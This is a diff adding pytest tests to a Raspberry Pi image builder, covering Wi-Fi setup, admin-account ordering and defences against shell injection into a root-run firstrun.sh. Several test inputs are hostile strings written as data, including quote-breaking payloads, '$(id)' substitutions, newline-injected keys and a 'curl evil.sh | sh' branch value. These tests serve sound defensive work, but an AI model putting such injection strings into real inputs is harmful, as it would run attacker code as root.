@@ -274,8 +274,36 @@ class TestCustomizeImage:
         assert config.wifi_password in firstrun
         assert config.wifi_country in firstrun
 
+    def test_wifi_country_is_set_and_the_radio_unblocked(self, built, config):
+        """Pi OS soft-blocks the radio until a regulatory domain is set."""
+        firstrun = built.read_file("firstrun.sh").decode()
+
+        assert f"WIFI_COUNTRY='{config.wifi_country}'" in firstrun
+        assert "do_wifi_country" in firstrun
+        assert "rfkill unblock wifi" in firstrun
+
+    def test_wifi_connection_filename_is_fixed(self, built):
+        """An SSID may contain a slash, which is not valid in a path."""
+        firstrun = built.read_file("firstrun.sh").decode()
+
+        assert "lablink-wifi.nmconnection" in firstrun
+        assert "${WIFI_SSID}.nmconnection" not in firstrun
+
     def test_branch_reaches_the_installer(self, built, config):
         assert config.branch in built.read_file("lablink-first-boot.sh").decode()
+
+    def test_admin_account_is_created_before_groups_are_applied(self, built):
+        """Recent Pi OS ships with no user, and userconf.txt is read a boot later.
+
+        If firstrun.sh only adds groups it silently does nothing, and the
+        account comes up without dialout - no USB serial instruments.
+        """
+        firstrun = built.read_file("firstrun.sh").decode()
+
+        creates = firstrun.index("userconf-pi/userconf")
+        groups = firstrun.index("usermod -aG")
+        assert creates < groups, "groups are applied before the account exists"
+        assert "dialout" in firstrun
 
     def test_ssh_flag_file_is_present(self, built):
         assert "ssh" in {n.lower() for n in built.list_root()}
@@ -299,6 +327,23 @@ class TestCustomizeImageOptions:
         assert "userconf.txt" not in names
         assert "lablink-admin-password" not in names
 
+    def test_no_wifi_leaves_the_wifi_block_inert(self, blank_image, config):
+        """An ethernet-only Pi is configured by leaving the SSID empty.
+
+        firstrun.sh guards the whole wifi section on a non-empty SSID, so an
+        empty one must render as an empty string rather than a leftover
+        placeholder, which would be a truthy SSID and write a junk connection.
+        """
+        config.wifi_ssid = ""
+        config.wifi_password = ""
+        customize_image(blank_image, config)
+
+        with Fat32Reader(blank_image, PART_OFFSET) as fs:
+            firstrun = fs.read_file("firstrun.sh").decode()
+
+        assert "WIFI_SSID=''" in firstrun
+        assert "WIFI_PASSWORD=''" in firstrun
+
     def test_rejects_an_image_that_boots_via_init(self, blank_image, config):
         """systemd.run is ignored when systemd is not PID 1 — fail loudly."""
         _install_pkg_resources_shim()
@@ -311,6 +356,98 @@ class TestCustomizeImageOptions:
 
         with pytest.raises(PiImageError, match="init="):
             customize_image(blank_image, config)
+
+
+class TestShellInjection:
+    """firstrun.sh runs as root, and its values come from wizard text fields."""
+
+    @pytest.mark.parametrize("hostile", [
+        "it's-a-network",
+        "a'; touch /tmp/pwned; echo '",
+        "back\\slash",
+        'double"quote',
+        "$(id)",
+        "`id`",
+    ])
+    def test_hostile_values_stay_inside_their_quotes(self, blank_image, config,
+                                                     tmp_path, hostile):
+        """An apostrophe in a Wi-Fi password must not end the assignment.
+
+        Everything after it would otherwise be executed as root on first boot,
+        reachable from a text field in the image-builder wizard.
+        """
+        config.wifi_ssid = hostile
+        config.wifi_password = hostile
+        config.hostname = hostile
+        customize_image(blank_image, config)
+
+        with Fat32Reader(blank_image, PART_OFFSET) as fs:
+            firstrun = fs.read_file("firstrun.sh").decode()
+
+        # Ask bash itself, rather than trusting our own reading of the quoting:
+        # source the assignments and check the values arrive intact.
+        harness = tmp_path / "check.sh"
+        assignments = "\n".join(
+            line for line in firstrun.splitlines()
+            if line.startswith(("WIFI_SSID=", "WIFI_PASSWORD=", "NEW_HOSTNAME="))
+        )
+        harness.write_text(
+            "canary=clean\n" + assignments + "\n"
+            'printf "%s" "$WIFI_SSID" > ssid.out\n'
+            'printf "%s" "$WIFI_PASSWORD" > pass.out\n'
+            'printf "%s" "$canary" > canary.out\n'
+        )
+        result = subprocess.run(["bash", str(harness)], cwd=tmp_path,
+                                capture_output=True, text=True)
+
+        assert result.returncode == 0, f"script did not parse: {result.stderr}"
+        assert (tmp_path / "ssid.out").read_text() == hostile
+        assert (tmp_path / "pass.out").read_text() == hostile
+        assert (tmp_path / "canary.out").read_text() == "clean"
+
+    @pytest.mark.parametrize("field", ["wifi_ssid", "wifi_password", "hostname",
+                                       "admin_user", "admin_password"])
+    def test_line_breaks_are_rejected(self, blank_image, config, field):
+        """A newline in an SSID would add keys to the NetworkManager file, and
+        in userconf.txt would corrupt the account record."""
+        setattr(config, field, "good\ninjected=value")
+
+        with pytest.raises(PiImageError, match="line break"):
+            customize_image(blank_image, config)
+
+    def test_hostile_values_do_not_execute(self, blank_image, config, tmp_path):
+        """The strongest form: the injected command must not run at all."""
+        marker = tmp_path / "pwned"
+        config.wifi_password = f"x'; touch {marker}; echo '"
+        customize_image(blank_image, config)
+
+        with Fat32Reader(blank_image, PART_OFFSET) as fs:
+            firstrun = fs.read_file("firstrun.sh").decode()
+
+        line = next(ln for ln in firstrun.splitlines()
+                    if ln.startswith("WIFI_PASSWORD="))
+        subprocess.run(["bash", "-c", line], cwd=tmp_path, capture_output=True)
+
+        assert not marker.exists(), "injected command executed"
+
+    @pytest.mark.parametrize("branch", [
+        'main"; curl evil.sh | sh; echo "',
+        "main$(id)",
+        "main`id`",
+        "-oProxyCommand=x",
+    ])
+    def test_hostile_branches_are_rejected(self, blank_image, config, branch):
+        """The branch lands in a URL inside double quotes, where quoting the
+        single-quote way does not help. It is restricted instead."""
+        config.branch = branch
+
+        with pytest.raises(PiImageError, match="Refusing to build with branch"):
+            customize_image(blank_image, config)
+
+    @pytest.mark.parametrize("branch", ["main", "feature/x-1", "v2.0.0", "a_b"])
+    def test_ordinary_branches_are_accepted(self, blank_image, config, branch):
+        config.branch = branch
+        customize_image(blank_image, config)  # must not raise
 
 
 class TestFilesystemConsistency:
